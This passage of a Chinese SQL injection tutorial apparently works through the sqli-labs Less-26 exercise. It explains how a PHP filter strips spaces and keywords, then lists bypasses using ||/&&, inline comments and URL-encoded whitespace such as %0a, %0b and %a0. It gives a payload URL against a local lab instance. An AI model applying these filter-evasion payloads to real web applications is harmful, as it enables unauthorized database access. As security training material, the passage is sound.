-  符号和关键字替换 and -- &&、or-- ||。
-  内联注释与多行注释/*! 内联注释*/ /* 多行注释*/
-  Mysql 中会自动识别 URL 与 Hex 编码好的内容。

### **2. 去除空格的代码分析**

```
preg_ replace(mixed $pattern，mixed $replacement，mixed $subject)
```

执行一个正则表达式的搜索和替换。

> $pattern:要搜索的模式，可以是字符串或一个字符串数组
>
> $replacement:用于替换的字符串或字符串数组。
>
> $subject:要搜索替换的目标字符串或字符串数组。

代码分析 Less-26 的 php 代码

### **3. 绕过去除空格的 SQL 注入**

编码: `hex,urlencode 空格 URL 编码%20`

- %09 TAB 键(水平)
- %0a 新建一行
- %0c 新的一页
- %0d return 功能
- %0b TAB 键(垂直)
- %a0

Less-26输入?id=`1' --+` ,没变化 ，因为都被过滤了

绕过方式

```
http://127.0.0.1:8088/Less-26/?id=1%27%20%0A%20||%271
```

Less-26 用`%a %0b` 绕过

### 4、绕过流量分析

空格都用 url 编码来替代 `%0a，%0b，%0c，%d，%a0`

单引号的闭合 `'`用配合闭合



